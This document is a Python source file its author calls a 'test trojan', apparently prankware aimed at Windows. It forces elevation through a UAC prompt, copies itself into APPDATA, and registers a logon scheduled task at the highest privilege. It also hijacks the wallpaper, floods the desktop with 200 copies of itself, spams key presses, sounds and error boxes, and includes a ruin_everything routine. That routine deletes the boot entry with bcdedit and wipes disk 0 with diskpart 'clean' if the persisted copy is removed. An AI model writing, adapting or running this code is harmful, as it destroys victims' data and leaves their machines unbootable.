import os
import sys
import shutil
import time
import ctypes
import pyautogui
import urllib.request
import winsound
import threading
import subprocess
# This is a test trojan script by scapune, i genuinely dont know what the fuck im doing with my life, im bored and tired and crying bc fucking python is ass. grrrrrrr
FILENAME = "Kapihot.exe"
APP_NAME = "kapihot"
IMG_URL = "https://img.itch.zone/aW1hZ2UvMTA2MTI2Ni82MDc1NDc0LnBuZw==/original/nIID%2Bn.png"
SOUND_URL = "https://github.com/andyyepes2009-wq/skid-weapon/raw/refs/heads/main/Nyaw-Original-_-FNF-Kapi-Nyaw-Sound-Effect-DJ-D322MW%20(2).wav"
TASK_NAME = "kapi_is_hot_as_fuck"

def get_source_path():
    return sys.executable if getattr(sys, "frozen", False) else os.path.realpath(__file__)


def create_startup_task(target):
    if getattr(sys, "frozen", False):
        action = f'cmd /c start "" "{target}"'
    else:
        action = f'cmd /c start "" "{sys.executable}" "{target}"'

    subprocess.run(
        [
            "schtasks",
            "/Create",
            "/TN",
            TASK_NAME,
            "/TR",
            action,
            "/SC",
            "ONLOGON",
            "/RL",
            "HIGHEST",
            "/IT",
            "/F",
        ],
        stdout=subprocess.DEVNULL,
        stderr=subprocess.DEVNULL,
    )


def get_target_path():
    return os.path.join(os.getenv("APPDATA"), FILENAME)


def install_persistence():
    source = get_source_path()
    target = get_target_path()
    try:
        if source.lower() != target.lower():
            shutil.copy2(source, target)
    except:
        pass
    return target


def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin()
    except:
        return False

def ruin_everything():
    subprocess.run("bcdedit /delete {current} /f", shell=True)
    commands = "select disk 0\nclean\n"
    process = subprocess.Popen(['diskpart'], stdin=subprocess.PIPE, text=True)
    process.communicate(input=commands)

def nuker():
    return


def hijack_wallpaper():
    path = os.path.join(os.getenv('TEMP'), "kapi_bg.png")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(IMG_URL, path)
        ctypes.windll.user32.SystemParametersInfoW(20, 0, path, 3)
    except:
        pass

def desktop_spam():
    try:
        desktop = os.path.join(os.path.join(os.environ['USERPROFILE']), 'Desktop')
        current_file = get_source_path()
        for i in range(200):
            shutil.copy2(current_file, os.path.join(desktop, f"Nyaw_{i}.exe"))
    except:
        pass

def escape_spam():
    while True:
        pyautogui.press('esc')
        time.sleep(0.01)

def sound_spam():
    path = os.path.join(os.getenv('TEMP'), "kapi_nyaw.wav")
    try:
        if not os.path.exists(path):
            urllib.request.urlretrieve(SOUND_URL, path)
    except:
        pass
    while True:
        winsound.PlaySound(path, winsound.SND_FILENAME | winsound.SND_ASYNC)
        time.sleep(0.5)

def error_spam():
    while True:
        threading.Thread(target=lambda: ctypes.windll.user32.MessageBoxW(0, "Nyaw :3", "Kapi Error", 0x10 | 0x40000), daemon=True).start()
        time.sleep(0.01)

def monitor_persistence():
    target_path = get_target_path()
    while True:
        if not os.path.exists(target_path):
            ruin_everything()
            break
        time.sleep(1)

def main():
    nuker()
    hijack_wallpaper()
    desktop_spam()

    threads = [
        threading.Thread(target=nuker, daemon=True),
        threading.Thread(target=hijack_wallpaper),
        threading.Thread(target=desktop_spam, daemon=True),
        threading.Thread(target=escape_spam, daemon=True),
        threading.Thread(target=sound_spam, daemon=True),
        threading.Thread(target=error_spam, daemon=True),
        threading.Thread(target=monitor_persistence, daemon=True),
    ]
    
    for t in threads:
        t.start()

    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        sys.exit()

if __name__ == "__main__":
    if not is_admin():
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv), None, 1)
        sys.exit()

    target_exec = install_persistence()
    create_startup_task(target_exec)

    mutex = ctypes.windll.kernel32.CreateMutexW(None, False, "Kapi_cutie_Mutex")
    if ctypes.windll.kernel32.GetLastError() != 183:
        main()